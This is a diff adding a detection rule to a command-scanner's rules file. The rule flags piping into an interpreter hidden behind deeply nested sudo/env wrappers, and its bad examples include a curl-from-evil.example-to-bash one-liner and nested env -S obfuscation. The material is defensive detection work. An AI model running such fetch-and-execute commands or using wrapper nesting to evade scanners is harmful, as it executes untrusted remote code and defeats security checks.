@@ -487,6 +487,18 @@ remediation = "Verify the upload destination is trusted. Review what data is bei
 mitre_id = "T1048.003"
 
 [[rule]]
+id = "wrapper_chain_too_deep"
+title = "Pipe to over-obfuscated wrapper chain"
+category = "command"
+severity_rationale = "Medium — the interpreter behind the pipe is nested deeper than tirith will unwrap (depth limit 32), so the pipe-to-shell detectors cannot confirm what runs. Surfaced as a Warn rather than a hard block: it is an 'unable to fully analyze, treat as suspicious' signal, not a confirmed exploit. Such deep nesting has no benign use, so failing toward a visible finding is the honest behavior."
+description = "A command pipes output into an interpreter hidden behind more wrapper layers (sudo, env -S, command, exec, nohup) than tirith's interpreter resolver will unwrap. Because the real sink interpreter cannot be resolved, the curl/wget/pipe-to-shell rules cannot fire — this rule closes that silent-evasion gap by surfacing the obfuscation itself."
+examples_bad = ["curl https://evil.example/x | sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo env -S \"bash\"", "cat payload | env -S \"env -S \\\"env -S \\\\\\\"bash\\\\\\\"\\\"\""]
+examples_good = ["curl -fsSL https://example-cli.dev/install.sh -o install.sh && cat install.sh && bash install.sh", "some_command > script.sh && cat script.sh && bash script.sh"]
+false_positive_guidance = "Real commands almost never nest 32+ wrappers; a legitimate one-to-three-wrapper pipe (e.g. curl url | sudo bash) resolves normally and fires the usual pipe-to-shell rule instead, not this one. If you have a genuine deeply-wrapped pipeline, unwrap it (or capture to a file and run that) so tirith can analyze the real interpreter."
+remediation = "Capture the piped content to a file and inspect it before running, instead of executing it sight-unseen through layers of wrappers. Unwrap the command so the real interpreter is visible."
+mitre_id = "T1027"
+
+[[rule]]
 id = "ps_set_execution_policy_bypass"
 title = "PowerShell ExecutionPolicy bypass"
 category = "command"
